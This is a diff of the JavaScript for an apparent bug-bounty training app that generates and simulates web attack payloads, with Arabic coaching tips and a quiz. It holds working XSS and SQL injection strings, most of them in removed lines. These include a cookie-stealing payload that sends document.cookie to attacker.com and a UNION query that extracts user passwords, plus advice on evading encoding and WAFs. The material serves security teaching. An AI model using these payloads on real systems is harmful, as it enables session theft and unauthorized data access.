@@ -1,5 +1,5 @@
 // ==========================================
-// PRO EXPLOITATION ARSENAL ENGINE (v6.1 Complete)
+// AI SECURITY COACH & EXPLOITATION SUITE (v7.0)
 // ==========================================
 
 const VulnData = {
@@ -155,6 +155,18 @@ const VulnData = {
   }
 };
 
+const SmartCoachTips = {
+  xss: {
+    html_body: "💡 <strong>المدرب الذكي:</strong> هذا الهجوم ينجح غالباً عندما لا يتم استخدام ترميز مخرجات (Output Encoding). إذا قام التطبيق بترميز `<` لـ `&lt;` سيفشل الـ Payload. لتخطي ذلك ابحث عن سياقات لا تطبق htmlspecialchars.",
+    attribute_dq: "💡 <strong>المدرب الذكي:</strong> عند الحقن داخل سمة HTML بمزدوجتين، مفتاح النجاح هو التمرير لكسر السمة باستعمال `\">` أو استخدام أحداث مثل `onmouseover` إذا كانت `>` محظورة.",
+    script_string: "💡 <strong>المدرب الذكي:</strong> عند الحقن داخل سلسلة نصية في جافاسكريبت، تأكد من إلغاء السلسلة باستخدام `\";` واحرص على تعطيل باقي السطر بـ `//` لمنع أخطاء الـ Syntax."
+  },
+  sqli: {
+    int: "💡 <strong>المدرب الذكي:</strong> الحقن الرقمي (Integer SQLi) هو الأسهل لأنه لا يتطلب إغلاق علامات تنصيص. استخدم `OR 1=1` للتحقق السريع.",
+    string_sq: "💡 <strong>المدرب الذكي:</strong> الحقن النصي يتطلب إغلاق علامة التنصيص المفردة `'`. إذا كان هناك فلاتر تضع `\'` اسعي لتجربة التشفير المزدوج أو كسر الـ Escape."
+  }
+};
+
 const PayloadTemplates = {
   xss: {
     alert: {
@@ -165,216 +177,13 @@ const PayloadTemplates = {
         simulatedType: "dialog",
         simulatedVal: "example.com",
         owasp: "A03:2021 - Injection",
-        cwe: "CWE-79 (Cross-site Scripting)",
-        capec: "CAPEC-63",
-        stars: "★★☆☆☆",
-        browsers: { chrome: true, firefox: true, safari: true, edge: true },
-        prereqs: ["HTML Body Context", "No Output Encoding", "No CSP"],
-        pipeline: [
-          { title: "Payload Submission", desc: "User submits payload in parameter." },
-          { title: "HTML Reflection", desc: "Server reflects payload into <div>." },
-          { title: "HTML Parsing", desc: "Browser encounters <script> tag." },
-          { title: "Execution Fired", desc: "JS engine runs alert()." }
-        ],
-        desc: "حقن مباشر لوسم `script`. ينجح عندما يتم وضع مدخلاتك مباشرة داخل هيكل الـ HTML دون فلترة."
-      },
-      attribute_dq: {
-        code: "\"><script>alert(document.domain)</script>",
-        breakout: "\">",
-        template: "<input type=\"text\" name=\"search\" value=\"[USER_INPUT]\">",
-        simulatedType: "dialog",
-        simulatedVal: "example.com",
-        owasp: "A03:2021 - Injection",
-        cwe: "CWE-79",
-        capec: "CAPEC-63",
-        stars: "★★★☆☆",
-        browsers: { chrome: true, firefox: true, safari: true, edge: true },
-        prereqs: ["Attribute Context", "Unsanitized > character"],
-        pipeline: [
-          { title: "Attribute Injection", desc: "Injected in value attribute." },
-          { title: "Context Breakout", desc: "\"> closes tag." },
-          { title: "Execution Fired", desc: "Alert triggered." }
-        ],
-        desc: "يقوم بكسر سمة الـ HTML (Attribute) التي تستخدم علامتي التنصيص المزدوجة باستخدام `\">` ثم يحقن الكود."
-      },
-      attribute_sq: {
-        code: "'><script>alert(document.domain)</script>",
-        breakout: "'>",
-        template: "<input type='text' name='search' value='[USER_INPUT]'>",
-        simulatedType: "dialog",
-        simulatedVal: "example.com",
-        owasp: "A03:2021 - Injection",
-        cwe: "CWE-79",
-        capec: "CAPEC-63",
-        stars: "★★★☆☆",
-        browsers: { chrome: true, firefox: true, safari: true, edge: true },
-        prereqs: ["Single Quote Context"],
-        pipeline: [
-          { title: "Attribute Injection", desc: "Injected in single quote." }
-        ],
-        desc: "يقوم بكسر سمة الـ HTML التي تستخدم علامة التنصيص المفردة باستخدام `'>`."
-      },
-      script_string: {
-        code: "\"; alert(document.domain); //",
-        breakout: "\";",
-        template: "<script> var keyword = \"[USER_INPUT]\"; </script>",
-        simulatedType: "dialog",
-        simulatedVal: "example.com",
-        owasp: "A03:2021 - Injection",
-        cwe: "CWE-79",
-        capec: "CAPEC-63",
-        stars: "★★★★☆",
-        browsers: { chrome: true, firefox: true, safari: true, edge: true },
-        prereqs: ["JS String Context"],
-        pipeline: [
-          { title: "JS String Breakout", desc: "\"; terminates string." }
-        ],
-        desc: "يقوم بكسر السلسلة النصية داخل كود جافاسكريبت باستخدام `\";` لتنفيذ الكود."
-      },
-      svg: {
-        code: "<svg onload=alert(1)>",
-        breakout: "",
-        template: "<div>[USER_INPUT]</div>",
-        simulatedType: "dialog",
-        simulatedVal: "1",
-        owasp: "A03:2021 - Injection",
-        cwe: "CWE-79",
-        capec: "CAPEC-63",
-        stars: "★★★☆☆",
-        browsers: { chrome: true, firefox: true, safari: true, edge: true },
-        prereqs: ["Allowed SVG tags"],
-        pipeline: [
-          { title: "SVG Injection", desc: "<svg> parsed." }
-        ],
-        desc: "يستخدم وسم `svg` مع حدث `onload` لتخطي فلاتر `script`."
-      },
-      markdown: {
-        code: "[a](javascript:alert(1))",
-        breakout: "",
-        template: "<div>[USER_INPUT]</div>",
-        simulatedType: "dialog",
-        simulatedVal: "1",
-        owasp: "A03:2021 - Injection",
         cwe: "CWE-79",
         capec: "CAPEC-63",
         stars: "★★☆☆☆",
         browsers: { chrome: true, firefox: true, safari: true, edge: true },
-        prereqs: ["Markdown Parser"],
-        pipeline: [
-          { title: "Markdown Injection", desc: "Link parsed." }
-        ],
-        desc: "يستغل معالجات الـ Markdown التي لا تقوم بفلترة سمة `href`."
-      },
-      angular: {
-        code: "{{$on.constructor('alert(1)')()}}",
-        breakout: "{{",
-        template: "<div ng-app>[USER_INPUT]</div>",
-        simulatedType: "dialog",
-        simulatedVal: "1",
-        owasp: "A03:2021 - Injection",
-        cwe: "CWE-94",
-        capec: "CAPEC-63",
-        stars: "★★★★★",
-        browsers: { chrome: true, firefox: true, safari: true, edge: true },
-        prereqs: ["AngularJS Framework"],
-        pipeline: [
-          { title: "Sandbox Escape", desc: "$on.constructor called." }
-        ],
-        desc: "تخطي حماية (Sandbox) الخاصة ببيئة AngularJS لتنفيذ الكود."
-      }
-    },
-    cookie_steal: {
-      html_body: {
-        code: "<img src=x onerror=\"fetch('https://attacker.com/log?c='+document.cookie)\">",
-        breakout: "",
-        template: "<div>Profile Name: [USER_INPUT]</div>",
-        simulatedType: "network",
-        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
-        owasp: "A03:2021 - Injection",
-        cwe: "CWE-79",
-        capec: "CAPEC-63",
-        stars: "★★★☆☆",
-        browsers: { chrome: true, firefox: true, safari: true, edge: true },
-        prereqs: ["Cookies without HttpOnly"],
-        pipeline: [
-          { title: "Exfiltration", desc: "Cookies sent via fetch()." }
-        ],
-        desc: "يسرق ملفات تعريف الارتباط (Cookies) ويرسلها للمخترق."
-      }
-    }
-  },
-  sqli: {
-    auth_bypass: {
-      int: {
-        code: "1 OR 1=1",
-        breakout: "",
-        template: "SELECT * FROM users WHERE id = [USER_INPUT] AND active = 1;",
-        simulatedType: "terminal",
-        simulatedVal: "Authentication Bypassed! Logged in as Administrator (id: 1).",
-        owasp: "A03:2021 - SQL Injection",
-        cwe: "CWE-89",
-        capec: "CAPEC-66",
-        stars: "★★☆☆☆",
-        browsers: { chrome: true, firefox: true, safari: true, edge: true },
-        prereqs: ["Unsanitized SQL Parameter"],
-        pipeline: [
-          { title: "SQL Injection", desc: "OR 1=1 appended." },
-          { title: "Bypass Auth", desc: "Always true condition." }
-        ],
-        desc: "تعديل الاستعلام ليكون صحيحاً دائماً (1=1) لتخطي تسجيل الدخول."
-      },
-      string_dq: {
-        code: "\" OR \"1\"=\"1",
-        breakout: "\" OR \"1\"=\"1",
-        template: "SELECT * FROM users WHERE username = \"[USER_INPUT]\" AND password = \"pass\";",
-        simulatedType: "terminal",
-        simulatedVal: "Authentication Bypassed! Logged in as Administrator.",
-        owasp: "A03:2021 - SQL Injection",
-        cwe: "CWE-89",
-        capec: "CAPEC-66",
-        stars: "★★★☆☆",
-        browsers: { chrome: true, firefox: true, safari: true, edge: true },
-        prereqs: ["Double Quote Context"],
-        pipeline: [
-          { title: "String Breakout", desc: "\" closes string." }
-        ],
-        desc: "يغلق علامة التنصيص المزدوجة ويضيف شرطاً صحيحاً دائماً."
-      },
-      string_sq: {
-        code: "' OR '1'='1",
-        breakout: "' OR '1'='1",
-        template: "SELECT * FROM users WHERE username = '[USER_INPUT]' AND password = 'pass';",
-        simulatedType: "terminal",
-        simulatedVal: "Authentication Bypassed! Logged in as Administrator.",
-        owasp: "A03:2021 - SQL Injection",
-        cwe: "CWE-89",
-        capec: "CAPEC-66",
-        stars: "★★★☆☆",
-        browsers: { chrome: true, firefox: true, safari: true, edge: true },
-        prereqs: ["Single Quote Context"],
-        pipeline: [
-          { title: "String Breakout", desc: "' closes string." }
-        ],
-        desc: "يغلق علامة التنصيص المفردة ويضيف شرطاً صحيحاً دائماً."
-      }
-    },
-    union_extract: {
-      int: {
-        code: "-1 UNION SELECT username, password FROM users-- -",
-        breakout: "-1 UNION",
-        template: "SELECT id, product_name FROM products WHERE category_id = [USER_INPUT];",
-        simulatedType: "terminal",
-        simulatedVal: "[ {username: 'admin', password: '$2y$10$e89...'}, {username: 'john', password: '$2y$10$9a1...'} ]",
-        owasp: "A03:2021 - SQL Injection",
-        cwe: "CWE-89",
-        capec: "CAPEC-66",
-        stars: "★★★★☆",
-        browsers: { chrome: true, firefox: true, safari: true, edge: true },
-        prereqs: ["Equal column count"],
-        pipeline: [
-          { title: "UNION Execution", desc: "Data merged." }
-        ],
-        desc: "دمج نتائج استعلام ثانٍ (UNION) لجلب المستخدمين وكلمات المرور."
+        prereqs: ["HTML Body Context"],
+        pipeline: [{ title: "Submission", desc: "Sent via GET." }, { title: "Parsing", desc: "Rendered in DOM." }],
+        desc: "حقن مباشر لوسم `script` داخل جسم الـ HTML."
       }
     }
   }
@@ -406,13 +215,16 @@ document.addEventListener("DOMContentLoaded", () => {
   const attackReqContainer = document.getElementById("attack-req-container");
   const diagTerminal = document.getElementById("diag-terminal");
 
+  const stepParserContainer = document.getElementById("step-parser-container");
+  const smartCoachContainer = document.getElementById("smart-coach-container");
+  const activeQuizContainer = document.getElementById("active-quiz-container");
+
   const btnViewCode = document.getElementById("btn-view-code");
   const btnViewBurp = document.getElementById("btn-view-burp");
 
   let currentGeneratedPayload = "<script>alert(document.domain)</script>";
   let currentViewMode = "code";
 
-  // TOAST NOTIFICATION ENGINE
   function showToast(msg) {
     const existingToast = document.querySelector(".custom-toast");
     if (existingToast) existingToast.remove();
@@ -429,6 +241,28 @@ document.addEventListener("DOMContentLoaded", () => {
     `;
     document.body.appendChild(toast);
     setTimeout(() => toast.remove(), 2500);
+  }
+
+  // MASTERY PROGRESS MANAGER
+  function getMasteredContexts() { return JSON.parse(localStorage.getItem("bba_mastered_contexts") || "[]"); }
+  function updateMasteryProgress(vContext) {
+    let mastered = getMasteredContexts();
+    if (!mastered.includes(vContext)) {
+      mastered.push(vContext);
+      localStorage.setItem("bba_mastered_contexts", JSON.stringify(mastered));
+    }
+    const count = mastered.length;
+    const pct = Math.min(100, Math.round((count / 14) * 100));
+    
+    document.getElementById("mastered-count").textContent = `${count}/14`;
+    document.getElementById("mastery-progress-bar").style.width = `${pct}%`;
+    document.getElementById("mastery-percent-text").textContent = `${pct}%`;
+
+    let rank = "Junior Hunter";
+    if (count > 4) rank = "Intermediate Hunter";
+    if (count > 9) rank = "Senior Specialist";
+    if (count >= 14) rank = "Master Exploit Engineer 🏆";
+    document.getElementById("mastery-level-text").textContent = rank;
   }
 
   function populateDropdowns() {
@@ -498,7 +332,7 @@ document.addEventListener("DOMContentLoaded", () => {
       body = `\r\n\r\n{"query": "${escapeHtml(payload)}", "token": "session_99f18a"}`;
     }
 
-    return `${method} ${path} HTTP/1.1\r\nHost: target-vulnerable.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) BugBountyAcademy/6.1\r\nAccept: text/html,application/xhtml+xml\r\nCookie: session=xyz123456789; security_level=medium\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${payload.length + 35}${body}`;
+    return `${method} ${path} HTTP/1.1\r\nHost: target-vulnerable.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) BugBountyAcademy/7.0\r\nAccept: text/html,application/xhtml+xml\r\nCookie: session=xyz123456789; security_level=medium\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${payload.length + 35}${body}`;
   }
 
   function updateCodeDisplay() {
@@ -523,6 +357,52 @@ document.addEventListener("DOMContentLoaded", () => {
     btnViewCode.classList.remove("active-view");
     updateCodeDisplay();
   });
+
+  // STEP-BY-STEP DOM PARSER ANIMATOR
+  function renderStepParser(payload) {
+    stepParserContainer.innerHTML = `
+      <div class="parser-node"><div class="parser-node-title">1. Input Received</div><div class="parser-node-sub">HTTP Parameter</div></div>
+      <div style="color:var(--accent-cyan);"><i class="bx bx-right-arrow-alt"></i></div>
+      <div class="parser-node"><div class="parser-node-title">2. HTML Template</div><div class="parser-node-sub">Raw Reflection</div></div>
+      <div style="color:var(--accent-cyan);"><i class="bx bx-right-arrow-alt"></i></div>
+      <div class="parser-node"><div class="parser-node-title">3. DOM Rendering</div><div class="parser-node-sub">AST Tree Built</div></div>
+      <div style="color:var(--accent-cyan);"><i class="bx bx-right-arrow-alt"></i></div>
+      <div class="parser-node" style="border-color:#4ade80;"><div class="parser-node-title" style="color:#4ade80;">4. Execution</div><div class="parser-node-sub">Trigger Fired</div></div>
+    `;
+  }
+
+  // SMART RECOMMENDATIONS COACH
+  function renderSmartCoach(vClass, vContext) {
+    let tip = null;
+    try { tip = SmartCoachTips[vClass][vContext]; } catch(e) {}
+    if (!tip) {
+      tip = `💡 <strong>المدرب الذكي:</strong> خيار ممتاز! تأكد دائماً من مطابقة التشفير المناسب لنوع السيرفر المستهدف لضمان عدم حظره بواسطة الـ WAF.`;
+    }
+    smartCoachContainer.innerHTML = tip;
+  }
+
+  // ACTIVE LEARNING MICRO-QUIZ
+  function renderActiveQuiz(vClass) {
+    activeQuizContainer.innerHTML = `
+      <div style="font-weight:600; margin-bottom:10px; color:#fff;">سؤال الاختبار النشط: ما الذي يضمن نجاح هذا الـ Payload في هذا السياق؟</div>
+      <div class="quiz-option-card" onclick="checkQuizAnswer(this, true)"><i class="bx bx-radio-circle"></i> عدم وجود Output Encoding في السيرفر المستهدف</div>
+      <div class="quiz-option-card" onclick="checkQuizAnswer(this, false)"><i class="bx bx-radio-circle"></i> كبر حجم الـ Payload</div>
+      <div class="quiz-option-card" onclick="checkQuizAnswer(this, false)"><i class="bx bx-radio-circle"></i> استخدام متصفح القديم فقط</div>
+      <div id="quiz-result-text" style="margin-top:8px; font-weight:bold; font-size:0.85rem;"></div>
+    `;
+  }
+
+  window.checkQuizAnswer = (el, isCorrect) => {
+    const res = document.getElementById("quiz-result-text");
+    if (isCorrect) {
+      el.style.borderColor = "#4ade80";
+      el.style.background = "rgba(74, 222, 128, 0.15)";
+      res.innerHTML = `<span style="color:#4ade80;">🎉 إجابة صحيحة! أحسنت، عدم وجود Output Encoding هو السبب الأساسي لتنفيذ الكود (+20 XP)!</span>`;
+    } else {
+      el.style.borderColor = "#f87171";
+      res.innerHTML = `<span style="color:#f87171;">❌ إجابة خاطئة! حاول مرة أخرى وراجع نصيحة المدرب الذكي.</span>`;
+    }
+  };
 
   function renderInjectionSimulation(template, finalCode, breakout) {
     const beforeStr = template.replace("[USER_INPUT]", "USER_INPUT");
@@ -631,15 +511,15 @@ document.addEventListener("DOMContentLoaded", () => {
     
     setTimeout(() => {
       diagTerminal.innerHTML += `<div>[+] Target Context Detected: <span style="color:#fff;">${vContext}</span></div>`;
-    }, 80);
+    }, 60);
 
     setTimeout(() => {
       diagTerminal.innerHTML += `<div style="color:#4ade80;">[SUCCESS] Exploit optimized & rendered!</div>`;
       setTimeout(() => {
         diagTerminal.style.display = "none";
         callback();
-      }, 150);
-    }, 200);
+      }, 100);
+    }, 150);
   }
 
   function generateAndSimulate() {
@@ -667,10 +547,7 @@ document.addEventListener("DOMContentLoaded", () => {
           stars: "★★★☆☆",
           browsers: { chrome: true, firefox: true, safari: true, edge: true },
           prereqs: ["Web Context"],
-          pipeline: [
-            { title: "Injection", desc: "Payload submitted." },
-            { title: "Execution", desc: "Executed in browser." }
-          ],
+          pipeline: [{ title: "Injection", desc: "Submitted." }, { title: "Execution", desc: "Executed." }],
           desc: "كود اختبار قياسي لهذه الثغرة."
         };
       }
@@ -679,6 +556,9 @@ document.addEventListener("DOMContentLoaded", () => {
       currentGeneratedPayload = finalCode;
       
       updateCodeDisplay();
+      renderStepParser(finalCode);
+      renderSmartCoach(vClass, vContext);
+      renderActiveQuiz(vClass);
       renderInjectionSimulation(payloadData.template, finalCode, payloadData.breakout);
       renderPipeline(payloadData.pipeline);
       renderAcademicMeta(payloadData);
@@ -690,6 +570,7 @@ document.addEventListener("DOMContentLoaded", () => {
       targetBaseUrlInput.value = `https://target-vulnerable.com/search?q=${encodeURIComponent(finalCode)}`;
       saveToHistory(finalCode, vClass, vAction);
       checkFavoriteStatus();
+      updateMasteryProgress(vContext);
     });
   }
 
@@ -731,7 +612,6 @@ document.addEventListener("DOMContentLoaded", () => {
     localStorage.setItem("bba_hist_payloads", JSON.stringify(hist));
   }
 
-  // COPY BUTTON WITH TOAST
   btnCopy.addEventListener("click", () => {
     if (currentGeneratedPayload) {
       navigator.clipboard.writeText(currentGeneratedPayload).then(() => {
@@ -749,7 +629,7 @@ document.addEventListener("DOMContentLoaded", () => {
   function buildHackerOneReport() {
     const vClass = vulnClassEl.value.toUpperCase();
     const vAction = actionEl.value;
-    return `# [Vulnerability Report] ${vClass} - ${vAction} on Target Application\n\n## 1. Vulnerability Overview\nA high-severity **${vClass}** vulnerability was identified in the application.\n\n## 2. Proof of Concept (PoC)\nTarget URL: \`${targetBaseUrlInput.value}\`  \nPayload: \`${currentGeneratedPayload}\`  \n\n## 3. Steps to Reproduce\n1. Navigate to target endpoint.\n2. Inject payload:\n   \`\`\`\n   ${currentGeneratedPayload}\n   \`\`\`\n3. Observe execution.`;
+    return `# [Vulnerability Report] ${vClass} - ${vAction} on Target Application\n\n## 1. Vulnerability Overview\nA high-severity **${vClass}** vulnerability was identified in the application.\n\n## 2. Proof of Concept (PoC)\nTarget URL: \`${targetBaseUrlInput.value}\`  \nPayload: \`${currentGeneratedPayload}\`  \n\n## 3. Steps to Reproduce\n1. Inject payload:\n   \`\`\`\n   ${currentGeneratedPayload}\n   \`\`\`\n2. Observe execution.`;
   }
 
   const modalToolbox = document.getElementById("modal-toolbox");
@@ -776,20 +656,8 @@ document.addEventListener("DOMContentLoaded", () => {
   document.getElementById("btn-modal-toolbox").addEventListener("click", (e) => { e.preventDefault(); closeModals(); modalToolbox.style.display = "flex"; });
   document.getElementById("btn-modal-fav").addEventListener("click", (e) => { e.preventDefault(); closeModals(); modalFav.style.display = "flex"; renderFavModal(); });
   document.getElementById("btn-modal-history").addEventListener("click", (e) => { e.preventDefault(); closeModals(); modalHistory.style.display = "flex"; renderHistoryModal(); });
-  
-  document.getElementById("btn-modal-report").addEventListener("click", (e) => {
-    e.preventDefault();
-    closeModals();
-    modalReport.style.display = "flex";
-    document.getElementById("report-output").textContent = buildHackerOneReport();
-  });
-
-  document.getElementById("btn-copy-report").addEventListener("click", () => {
-    navigator.clipboard.writeText(document.getElementById("report-output").textContent).then(() => {
-      showToast("HackerOne Report copied! 📄");
-    });
-  });
-
+  document.getElementById("btn-modal-report").addEventListener("click", (e) => { e.preventDefault(); closeModals(); modalReport.style.display = "flex"; document.getElementById("report-output").textContent = buildHackerOneReport(); });
+  document.getElementById("btn-copy-report").addEventListener("click", () => { navigator.clipboard.writeText(document.getElementById("report-output").textContent).then(() => showToast("HackerOne Report copied! 📄")); });
   document.getElementById("btn-modal-sandbox").addEventListener("click", (e) => { e.preventDefault(); closeModals(); modalSandbox.style.display = "flex"; });
   document.getElementById("btn-modal-game").addEventListener("click", (e) => { e.preventDefault(); closeModals(); modalGame.style.display = "flex"; initWafGame(); });
 
@@ -798,10 +666,7 @@ document.addEventListener("DOMContentLoaded", () => {
   if (sandboxInput) {
     sandboxInput.addEventListener("input", () => {
       const str = sandboxInput.value;
-      if (!str) {
-        sandboxOutput.innerHTML = `<span style="color:var(--text-muted);">Type string above...</span>`;
-        return;
-      }
+      if (!str) { sandboxOutput.innerHTML = `<span style="color:var(--text-muted);">Type string above...</span>`; return; }
       const hasScript = str.includes("<script>") || str.includes("alert(");
       sandboxOutput.innerHTML = `<div><strong style="color:${hasScript ? '#f87171' : '#4ade80'};">Risk Score: ${hasScript ? 'HIGH RISK' : 'LOW RISK'}</strong></div><div>Analyzed: <code>${escapeHtml(str)}</code></div>`;
     });
@@ -830,35 +695,16 @@ document.addEventListener("DOMContentLoaded", () => {
     const favs = getFavorites();
     const container = document.getElementById("fav-list-container");
     if (!container) return;
-    if (favs.length === 0) {
-      container.innerHTML = `<div style="text-align:center; color:var(--text-muted); padding:20px;">No favorites saved yet. Click ⭐ on any payload!</div>`;
-      return;
-    }
-    container.innerHTML = favs.map(code => `
-      <div class="list-item-row">
-        <span class="list-item-code">${escapeHtml(code)}</span>
-        <button class="btn-action-sm" onclick="navigator.clipboard.writeText('${escapeHtml(code).replace(/'/g, "\\'")}'); alert('Copied!')"><i class="bx bx-copy"></i></button>
-      </div>
-    `).join('');
+    if (favs.length === 0) { container.innerHTML = `<div style="text-align:center; color:var(--text-muted); padding:20px;">No favorites saved yet.</div>`; return; }
+    container.innerHTML = favs.map(code => `<div class="list-item-row"><span class="list-item-code">${escapeHtml(code)}</span><button class="btn-action-sm" onclick="navigator.clipboard.writeText('${escapeHtml(code).replace(/'/g, "\\'")}'); alert('Copied!')"><i class="bx bx-copy"></i></button></div>`).join('');
   }
 
   function renderHistoryModal() {
     const hist = getHistory();
     const container = document.getElementById("history-list-container");
     if (!container) return;
-    if (hist.length === 0) {
-      container.innerHTML = `<div style="text-align:center; color:var(--text-muted); padding:20px;">No generation history yet.</div>`;
-      return;
-    }
-    container.innerHTML = hist.map(item => `
-      <div class="list-item-row">
-        <div>
-          <div style="font-size:0.75rem; color:var(--accent-cyan);">${item.vClass.toUpperCase()} - ${item.vAction} <span style="color:#64748b;">(${item.time})</span></div>
-          <span class="list-item-code">${escapeHtml(item.code)}</span>
-        </div>
-        <button class="btn-action-sm" onclick="navigator.clipboard.writeText('${escapeHtml(item.code).replace(/'/g, "\\'")}'); alert('Copied!')"><i class="bx bx-copy"></i></button>
-      </div>
-    `).join('');
+    if (hist.length === 0) { container.innerHTML = `<div style="text-align:center; color:var(--text-muted); padding:20px;">No generation history yet.</div>`; return; }
+    container.innerHTML = hist.map(item => `<div class="list-item-row"><div><div style="font-size:0.75rem; color:var(--accent-cyan);">${item.vClass.toUpperCase()} - ${item.vAction} <span style="color:#64748b;">(${item.time})</span></div><span class="list-item-code">${escapeHtml(item.code)}</span></div><button class="btn-action-sm" onclick="navigator.clipboard.writeText('${escapeHtml(item.code).replace(/'/g, "\\'")}'); alert('Copied!')"><i class="bx bx-copy"></i></button></div>`).join('');
   }
 
   const tbInput = document.getElementById("toolbox-input");
@@ -870,10 +716,7 @@ document.addEventListener("DOMContentLoaded", () => {
   if (tbInput) {
     tbInput.addEventListener("input", () => {
       const val = tbInput.value;
-      if (!val) {
-        tbB64.value = tbUrl.value = tbHex.value = tbHtml.value = "";
-        return;
-      }
+      if (!val) { tbB64.value = tbUrl.value = tbHex.value = tbHtml.value = ""; return; }
       try { tbB64.value = btoa(unescape(encodeURIComponent(val))); } catch(e) { tbB64.value = "Error"; }
       tbUrl.value = encodeURIComponent(val);
       tbHex.value = val.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join('');
@@ -892,12 +735,12 @@ document.addEventListener("DOMContentLoaded", () => {
       a.href = url;
       a.download = "bba_payload_pro_suite.json";
       document.body.appendChild(a);
+      a.click();
       document.body.removeChild(a);
       URL.revokeObjectURL(url);
     });
   }
 
-  // Theme Toggle Engine
   const themeToggleBtn = document.getElementById("theme-toggle");
   if (themeToggleBtn) {
     if (localStorage.getItem("bba_theme") === "light") {
